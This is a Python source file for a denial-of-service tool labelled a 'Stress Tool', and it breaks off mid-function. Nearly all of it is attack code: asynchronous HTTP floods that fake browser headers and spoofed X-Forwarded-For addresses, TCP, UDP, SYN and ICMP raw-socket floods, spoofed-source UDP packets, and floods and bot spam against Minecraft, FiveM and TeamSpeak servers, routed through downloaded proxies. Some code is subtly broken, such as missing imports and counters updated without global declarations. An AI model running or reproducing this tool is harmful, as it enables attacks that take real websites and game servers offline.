#!/usr/bin/env python3

import asyncio
import aiohttp
from aiohttp import ClientTimeout, ClientResponse, ClientSession, TCPConnector
import argparse
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from ctypes import byref, create_string_buffer, c_int, c_uint32, c_ulong, CDLL, get_errno
from ctypes.util import find_library
from dataclasses import dataclass, field
from ipaddress import ip_address
from itertools import cycle, islice
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint, random
from re import compile
from socket import (AF_INET, AF_INET6, IPPROTO_IP, IPPROTO_IPV6, IPPROTO_TCP,
                    IPPROTO_UDP, SOCK_DGRAM, SOCK_RAW, SOCK_STREAM, TCP_NODELAY,
                    gethostbyname, gethostname, inet_ntop, inet_pton, socket,
                    timeout as sock_timeout)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv, exit as _exit
from threading import Event, Lock, Semaphore, Thread
from time import sleep, time
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
import certifi
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, cookies
from yarl import URL
from base64 import b64encode

def configure_ssl_context() -> SSLContext:
    ctx = create_default_context(cafile=certifi.where())
    ctx.check_hostname = False
    ctx.verify_mode = CERT_NONE
    if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    if hasattr(ssl, "OP_NO_TLSv1"):
        ctx.options |= ssl.OP_NO_TLSv1
    if hasattr(ssl, "OP_NO_TLSv1_1"):
        ctx.options |= ssl.OP_NO_TLSv1_1
    return ctx

basicConfig(
    format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S"
)
logger = getLogger("StressTest")
logger.setLevel("INFO")
CTX: SSLContext = configure_ssl_context()

VERSION: str = "4.0"
BASE_DIR: Path = Path(__file__).parent
LOCAL_IP: str = ""

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    LOCAL_IP = s.getsockname()[0]

with open(BASE_DIR / "config.json") as f:
    CONFIG = load(f)

class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

def log_exit(*message) -> None:
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)

class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX",
        "STOMP", "QUIC", "SLOWLORIS"
    }
    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP", "SSDP"
    }
    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP, "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
        "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE",
        "ICMP", "OVH-UDP", "QUIC-FLOOD"
    }
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

SEARCH_ENGINE_AGENTS: List[str] = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
]

TOR2WEB_GATEWAYS: List[str] = [
    "onion.city", "onion.cab", "onion.direct", "onion.sh", "onion.link",
    "onion.ws", "onion.pet", "onion.rip", "onion.plus", "onion.top",
    "onion.si", "onion.ly", "onion.my", "onion.sh", "onion.lu", "onion.casa",
    "onion.com.de", "onion.foundation", "onion.rodeo", "onion.lat",
    "tor2web.org", "tor2web.fi", "tor2web.blutmagie.de", "tor2web.to",
    "tor2web.io", "tor2web.in", "tor2web.it", "tor2web.xyz", "tor2web.su",
    "darknet.to", "s1.tor-gateways.de", "s2.tor-gateways.de", "s3.tor-gateways.de",
    "s4.tor-gateways.de", "s5.tor-gateways.de"
]

REFERERS: List[str] = [
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.google.com/translate?u=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.youtube.com/results?search_query=",
    "https://www.reddit.com/search?q=",
    "https://www.linkedin.com/search/results/all/?keywords=",
    "https://twitter.com/search?q=",
    "https://github.com/search?q=",
    "https://www.amazon.com/s?k=",
]

class Counter:
    def __init__(self, value=0):
        self._value = RawValue("i", value)
    def __iadd__(self, value):
        self._value.value += value
        return self
    def __int__(self):
        return self._value.value
    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SENT = Counter()
RPS_LOCK = Lock()

class Tools:
    IP_PATTERN = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    PROTOCOL_PATTERN = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2) -> str:
        multiples = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            mult = trunc(log2(i) / log2(base))
            val = i / pow(base, mult)
            suffix = multiples[mult].format("i" if binary else "")
            return f"{val:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> str:
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obj = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0 ** obj:.{precision}f}{suffixes[obj]}"
        return str(num)

    @staticmethod
    def request_size(resp: Response) -> int:
        size = len(resp.request.method) + len(resp.request.url)
        size += len("\r\n".join(f"{k}: {v}" for k, v in resp.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes) -> bool:
        global BYTES_SENT, REQUESTS_SENT
        try:
            sock.send(packet)
        except:
            return False
        BYTES_SENT += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock: socket, packet: bytes, target: Tuple[str, int]) -> bool:
        global BYTES_SENT, REQUESTS_SENT
        try:
            sock.sendto(packet, target)
        except:
            return False
        BYTES_SENT += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def safe_close(sock: Optional[socket] = None) -> None:
        if sock:
            with suppress(Exception):
                sock.close()

    @staticmethod
    def random_ipv4() -> str:
        return f"{randint(1,255)}.{randint(0,255)}.{randint(0,255)}.{randint(1,255)}"

    @staticmethod
    def random_ipv6() -> str:
        return f"{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}:{randint(0,65535):04x}"

class DDoSSession:
    def __init__(self, target_url: str, target_host: str, proxy_list: Optional[List[Proxy]] = None, timeout: int = 30):
        self.target_url = target_url
        self.target_host = target_host
        self.proxy_list = proxy_list
        self.session_lock = Lock()
        self.timeout = ClientTimeout(total=timeout)
        self.connector = None
        self.session = None
        if proxy_list:
            proxy_urls = []
            for p in proxy_list:
                if p.type == ProxyType.HTTP:
                    proxy_urls.append(f"http://{p.ip}:{p.port}")
                elif p.type == ProxyType.SOCKS4:
                    proxy_urls.append(f"socks4://{p.ip}:{p.port}")
                elif p.type == ProxyType.SOCKS5:
                    proxy_urls.append(f"socks5://{p.ip}:{p.port}")
            if proxy_urls:
                self.connector = TCPConnector(limit=0, limit_per_host=0, force_close=True, enable_cleanup_closed=True)
                self.session = ClientSession(connector=self.connector, timeout=self.timeout)
        else:
            self.connector = TCPConnector(limit=0, limit_per_host=0, force_close=True, enable_cleanup_closed=True, ssl=False)
            self.session = ClientSession(connector=self.connector, timeout=self.timeout)

    async def request(self, method: str = "GET", data: Optional[Dict] = None, headers: Optional[Dict] = None) -> Optional[ClientResponse]:
        if not self.session:
            return None
        url = self.target_url
        host = self.target_host
        if not headers:
            headers = {}
        headers.setdefault("User-Agent", randchoice(USER_AGENTS))
        headers.setdefault("Referer", randchoice(REFERERS) + parse.quote(host))
        headers.setdefault("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        headers.setdefault("Accept-Language", "en-US,en;q=0.5")
        headers.setdefault("Accept-Encoding", "gzip, deflate, br")
        headers.setdefault("Connection", "keep-alive")
        headers.setdefault("Upgrade-Insecure-Requests", "1")
        headers.setdefault("Cache-Control", "max-age=0")
        try:
            async with self.session.request(method, url, headers=headers, json=data, ssl=False) as response:
                await response.read()
                return response
        except Exception as e:
            logger.debug(f"DDoSSession request error: {e}")
            return None

    async def close(self) -> None:
        if self.session:
            await self.session.close()
        if self.connector:
            await self.connector.close()

class AsyncHttpFlood:
    def __init__(self, target_url: URL, target_host: str, method: str, rpc: int, duration: int, proxy_list: Optional[List[Proxy]], user_agents: List[str], referers: List[str]):
        self.target_url = target_url
        self.target_host = target_host
        self.method = method.upper()
        self.rpc = rpc
        self.duration = duration
        self.proxy_list = proxy_list
        self.user_agents = user_agents
        self.referers = referers
        self.stop_event = asyncio.Event()
        self.active_tasks = set()
        self.running = False

    async def start(self) -> None:
        self.running = True
        tasks = []
        max_concurrent = 1000
        semaphore = asyncio.Semaphore(max_concurrent)
        async def bounded_worker():
            async with semaphore:
                await self._worker()
        for _ in range(self.rpc):
            task = asyncio.create_task(bounded_worker())
            self.active_tasks.add(task)
            tasks.append(task)
            if len(tasks) >= max_concurrent:
                await asyncio.sleep(0)
        end_time = time() + self.duration
        while time() < end_time and self.running:
            await asyncio.sleep(1)
        self.stop_event.set()
        await asyncio.gather(*tasks, return_exceptions=True)
        self.running = False

    async def _worker(self) -> None:
        session = None
        try:
            session = await self._create_session()
            if not session:
                return
            while not self.stop_event.is_set():
                if self.method in {"GET", "PPS", "HEAD"}:
                    await self._send_request(session, "GET")
                elif self.method == "POST":
                    await self._send_post(session)
                elif self.method == "CFB":
                    await self._send_cfb(session)
                else:
                    await self._send_request(session, "GET")
                await asyncio.sleep(0)
        except Exception as e:
            logger.debug(f"AsyncHttpFlood worker error: {e}")
        finally:
            if session:
                await session.close()

    async def _create_session(self) -> Optional[ClientSession]:
        try:
            connector = TCPConnector(limit=0, limit_per_host=0, force_close=True, enable_cleanup_closed=True, ssl=False)
            timeout = ClientTimeout(total=30)
            if self.proxy_list:
                proxy = randchoice(self.proxy_list)
                proxy_url = None
                if proxy.type == ProxyType.HTTP:
                    proxy_url = f"http://{proxy.ip}:{proxy.port}"
                elif proxy.type == ProxyType.SOCKS5:
                    proxy_url = f"socks5://{proxy.ip}:{proxy.port}"
                elif proxy.type == ProxyType.SOCKS4:
                    proxy_url = f"socks4://{proxy.ip}:{proxy.port}"
                if proxy_url:
                    return ClientSession(connector=connector, timeout=timeout, proxy=proxy_url)
            return ClientSession(connector=connector, timeout=timeout)
        except:
            return None

    async def _send_request(self, session: ClientSession, method: str) -> None:
        headers = {
            "User-Agent": randchoice(self.user_agents),
            "Referer": randchoice(self.referers) + parse.quote(self.target_host),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": Tools.random_ipv4(),
            "X-Real-IP": Tools.random_ipv4(),
        }
        try:
            async with session.request(method, str(self.target_url), headers=headers, ssl=False) as response:
                await response.read()
                with RPS_LOCK:
                    REQUESTS_SENT += 1
        except:
            pass

    async def _send_post(self, session: ClientSession) -> None:
        headers = {
            "User-Agent": randchoice(self.user_agents),
            "Referer": randchoice(self.referers) + parse.quote(self.target_host),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "X-Forwarded-For": Tools.random_ipv4(),
        }
        data = {"data": ProxyTools.Random.rand_str(randint(32, 1024))}
        try:
            async with session.post(str(self.target_url), headers=headers, json=data, ssl=False) as response:
                await response.read()
                with RPS_LOCK:
                    REQUESTS_SENT += 1
        except:
            pass

    async def _send_cfb(self, session: ClientSession) -> None:
        headers = {
            "User-Agent": randchoice(self.user_agents),
            "Referer": randchoice(self.referers) + parse.quote(self.target_host),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": Tools.random_ipv4(),
        }
        try:
            async with session.get(str(self.target_url), headers=headers, ssl=False, allow_redirects=True) as response:
                await response.read()
                with RPS_LOCK:
                    REQUESTS_SENT += 1
        except:
            pass

class Layer4(Thread):
    def __init__(self, target: Tuple[str, int], reflectors: List[str] = None, method: str = "TCP", sync_event: Event = None, proxies: Set[Proxy] = None, protocol_id: int = 74):
        super().__init__(daemon=True)
        self.method = method.upper()
        self.target_ip, self.target_port = target
        self.reflectors = reflectors
        self.sync_event = sync_event
        self.proxies = list(proxies) if proxies else None
        self.protocol_id = protocol_id
        self.running = False

    def run(self) -> None:
        if self.sync_event:
            self.sync_event.wait()
        self.running = True
        method_handlers = {
            "TCP": self._tcp_flood,
            "UDP": self._udp_flood,
            "SYN": self._syn_flood,
            "ICMP": self._icmp_flood,
            "OVH-UDP": self._ovh_udp_flood,
            "VSE": self._vse_flood,
            "TS3": self._ts3_flood,
            "MINECRAFT": self._minecraft_flood,
            "CPS": self._cps_flood,
            "CONNECTION": self._connection_flood,
            "MCBOT": self._mcbot_flood,
            "FIVEM": self._fivem_flood,
            "FIVEM-TOKEN": self._fivem_token_flood,
            "MCPE": self._mcpe_flood,
            "QUIC-FLOOD": self._quic_flood,
        }
        handler = method_handlers.get(self.method, self._udp_flood)
        handler()
        self.running = False

    def _open_connection(self) -> Optional[socket]:
        if self.proxies:
            proxy = randchoice(self.proxies)
            sock = proxy.open_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        else:
            sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(0.9)
        sock.connect((self.target_ip, self.target_port))
        return sock

    def _tcp_flood(self) -> None:
        while self.running:
            sock = None
            try:
                sock = self._open_connection()
                while self.running and Tools.send(sock, randbytes(1024)):
                    pass
            except:
                pass
            finally:
                Tools.safe_close(sock)

    def _udp_flood(self) -> None:
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, randbytes(randint(512, 2048)), (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _syn_flood(self) -> None:
        sock = None
        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self.running:
                packet = self._build_syn_packet()
                Tools.sendto(sock, packet, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _build_syn_packet(self) -> bytes:
        ip = IP()
        ip.set_ip_src(LOCAL_IP)
        ip.set_ip_dst(self.target_ip)
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self.target_port)
        tcp.set_th_sport(randint(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _icmp_flood(self) -> None:
        sock = None
        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self.running:
                packet = self._build_icmp_packet()
                Tools.sendto(sock, packet, (self.target_ip, 0))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _build_icmp_packet(self) -> bytes:
        ip = IP()
        ip.set_ip_src(LOCAL_IP)
        ip.set_ip_dst(self.target_ip)
        icmp = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * randint(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _ovh_udp_flood(self) -> None:
        sock = None
        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self.running:
                packet = self._build_ovh_udp_packet()
                Tools.sendto(sock, packet, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _build_ovh_udp_packet(self) -> bytes:
        ip = IP()
        ip.set_ip_src(Tools.random_ipv4())
        ip.set_ip_dst(self.target_ip)
        udp = UDP()
        udp.set_uh_sport(randint(1024, 65535))
        udp.set_uh_dport(self.target_port)
        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ["/", "/null", "/%00%00%00%00", "/0/0/0/0/0/0"]
        payload = (
            f"{randchoice(methods)} {randchoice(paths)} HTTP/1.1\r\n"
            f"Host: {self.target_ip}:{self.target_port}\r\n\r\n"
        ).encode("latin1")
        udp.contains(Data(payload))
        ip.contains(udp)
        return ip.get_packet()

    def _vse_flood(self) -> None:
        payload = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, payload, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _ts3_flood(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, payload, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _minecraft_flood(self) -> None:
        handshake = self._minecraft_handshake(self.target_ip, self.target_port, self.protocol_id, 1)
        ping = self._minecraft_data(b"\x00")
        while self.running:
            sock = None
            try:
                sock = self._open_connection()
                Tools.send(sock, handshake)
                Tools.send(sock, ping)
            except:
                pass
            finally:
                Tools.safe_close(sock)

    def _minecraft_handshake(self, host: str, port: int, version: int, state: int) -> bytes:
        return self._minecraft_data(
            self._minecraft_varint(0x00),
            self._minecraft_varint(version),
            self._minecraft_data(host.encode()),
            self._minecraft_short(port),
            self._minecraft_varint(state),
        )

    @staticmethod
    def _minecraft_short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @staticmethod
    def _minecraft_data(*payload: bytes) -> bytes:
        payload_data = b"".join(payload)
        return Layer4._minecraft_varint(len(payload_data)) + payload_data

    @staticmethod
    def _minecraft_varint(value: int) -> bytes:
        buf = []
        while True:
            b = value & 0x7F
            value >>= 7
            buf.append(b | (0x80 if value > 0 else 0))
            if value == 0:
                break
        return bytes(buf)

    def _cps_flood(self) -> None:
        while self.running:
            sock = None
            try:
                sock = self._open_connection()
                REQUESTS_SENT += 1
            except:
                pass
            finally:
                Tools.safe_close(sock)

    def _connection_flood(self) -> None:
        def keep_alive():
            sock = None
            try:
                sock = self._open_connection()
                while self.running and sock.recv(1):
                    pass
            except:
                pass
            finally:
                Tools.safe_close(sock)
        while self.running:
            Thread(target=keep_alive, daemon=True).start()
            REQUESTS_SENT += 1

    def _mcbot_flood(self) -> None:
        while self.running:
            sock = None
            try:
                sock = self._open_connection()
                Tools.send(sock, self._minecraft_handshake_forwarded(self.target_ip, self.target_port, self.protocol_id, 2, Tools.random_ipv4(), uuid4()))
                username = f"{CONFIG['MCBOT']}{ProxyTools.Random.rand_str(5)}"
                password = b64encode(username.encode()).decode()[:8].title()
                Tools.send(sock, self._minecraft_data(self._minecraft_varint(0x00), self._minecraft_data(username.encode())))
                sleep(1.5)
                Tools.send(sock, self._minecraft_chat(self.protocol_id, f"/register {password} {password}"))
                Tools.send(sock, self._minecraft_chat(self.protocol_id, f"/login {password}"))
                while self.running and Tools.send(sock, self._minecraft_chat(self.protocol_id, str(ProxyTools.Random.rand_str(256)))):
                    sleep(1.1)
            except:
                pass
            finally:
                Tools.safe_close(sock)

    def _minecraft_handshake_forwarded(self, host: str, port: int, version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return self._minecraft_data(
            self._minecraft_varint(0x00),
            self._minecraft_varint(version),
            self._minecraft_data(host.encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()),
            self._minecraft_short(port),
            self._minecraft_varint(state),
        )

    def _minecraft_chat(self, protocol: int, message: str) -> bytes:
        packet_id = 0x03 if protocol >= 755 else 0x03 if protocol >= 464 else 0x02 if protocol >= 389 else 0x01 if protocol >= 343 else 0x02 if protocol >= 336 else 0x03 if protocol >= 318 else 0x02 if protocol >= 107 else 0x01
        return self._minecraft_data(self._minecraft_varint(packet_id), self._minecraft_data(message.encode()))

    def _fivem_flood(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, payload, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _fivem_token_flood(self) -> None:
        token = str(uuid4())
        steam_id = randint(76561197960265728, 76561199999999999)
        payload = f"token={token}&guid={steam_id}".encode("utf-8")
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, payload, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _mcpe_flood(self) -> None:
        payload = (b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f"
                   b"\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20"
                   b"\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73")
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                Tools.sendto(sock, payload, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _quic_flood(self) -> None:
        sock = None
        try:
            sock = socket(AF_INET, SOCK_DGRAM)
            while self.running:
                packet = self._build_quic_packet()
                Tools.sendto(sock, packet, (self.target_ip, self.target_port))
        except:
            pass
        finally:
            Tools.safe_close(sock)

    def _build_quic_packet(self) -> bytes:
        conn_id = randbytes(8)
        packet = (
            b"\xc0" +
            conn_id +
            randbytes(randint(64, 512))
        )
        return packet

class ProxyManager:
    @staticmethod
    def download_from_config(cfg: Dict, proxy_type: int) -> Set[Proxy]:
        providers = [p for p in cfg["proxy-providers"] if p["type"] == proxy_type or proxy_type == 0]
        logger.info(f"{bcolors.WARNING}Downloading proxies from {bcolors.OKBLUE}{len(providers)}{bcolors.WARNING} providers{bcolors.RESET}")
        all_proxies: Set[Proxy] = set()
        with ThreadPoolExecutor(max_workers=len(providers)) as executor:
            futures = {executor.submit(ProxyManager._download, prov, ProxyType.stringToProxyType(str(prov["type"]))) for prov in providers}
            for future in as_completed(futures):
                all_proxies.update(future.result())
        return all_proxies

    @staticmethod
    def _download(provider: Dict, proxy_type: ProxyType) -> Set[Proxy]:
        proxies: Set[Proxy] = set()
        try:
            resp = Session().get(provider["url"], timeout=provider["timeout"])
            lines = resp.text.splitlines()
            for line in lines:
                try:
                    proxy = ProxyUtiles.parseAllIPPort([line], proxy_type)
                    proxies.update(proxy)
                except:
                    pass
        except Exception as e:
            logger.error(f"Proxy download error from {provider['url']}: {e}")
        return proxies

    @staticmethod
    def load_proxy_file(proxy_file: Path, proxy_type: int, target_url: Optional[URL] = None, threads: int = 50) -> Optional[List[Proxy]]:
        if not proxy_file.exists():
            logger.warning(f"{bcolors.WARNING}Proxy file not found, downloading proxies...{bcolors.RESET}")
            proxy_file.parent.mkdir(parents=True, exist_ok=True)
            all_proxies = ProxyManager.download_from_config(CONFIG, proxy_type)
            logger.info(f"{bcolors.OKBLUE}{len(all_proxies)}{bcolors.WARNING} proxies downloaded, checking...{bcolors.RESET}")
            checked = ProxyChecker.checkAll(all_proxies, timeout=5, threads=threads, url=str(target_url) if target_url else "http://httpbin.org/get")
            with proxy_file.open("w") as f:
                for proxy in checked:
                    f.write(f"{proxy}\n")
        proxies = ProxyUtiles.readFromFile(proxy_file)
        if proxies:
            logger.info(f"{bcolors.WARNING}Proxy count: {bcolors.OKBLUE}{len(proxies)}{bcolors.RESET}")
        else:
            logger.warning(f"{bcolors.WARNING}No proxies available, running without proxies{bcolors.RESET}")
        return list(proxies) if proxies else None

class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def usage():
        print(f"Stress Tool v{VERSION} - {len(Methods.ALL_METHODS)} métodos disponibles")
        print("Uso L7: python script.py <method> <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>")
        print("Uso L4: python script.py <method> <ip:port> <threads> <duration> [reflector_file|proxy_type proxy_file]")

    @staticmethod
    def run_console() -> None:        
        prompt = f"{gethostname()}@StressTool:~# "
        while True:
            cmd = input(prompt).strip()
            if not cmd:
                continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)
            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:", ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue
            if cmd in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                log_exit()
            if cmd == "CLEAR":
                print("\033c")
                continue
            if cmd not in ToolsConsole.METHODS:
                print(f"{cmd}: command not found")
                continue
            if cmd == "DSTAT":
                ToolsConsole._dstat()
            elif cmd == "PING":
                ToolsConsole._ping()
            elif cmd == "INFO":
                ToolsConsole._info()
            elif cmd == "TSSRV":
                ToolsConsole._tssrv()
            elif cmd == "CHECK":
                ToolsConsole._check()
            elif cmd in {"CFIP", "DNS"}:
                print("Coming soon")
                continue

    @staticmethod
    def _dstat() -> None:
        prev = net_io_counters(pernic=False)
        try:
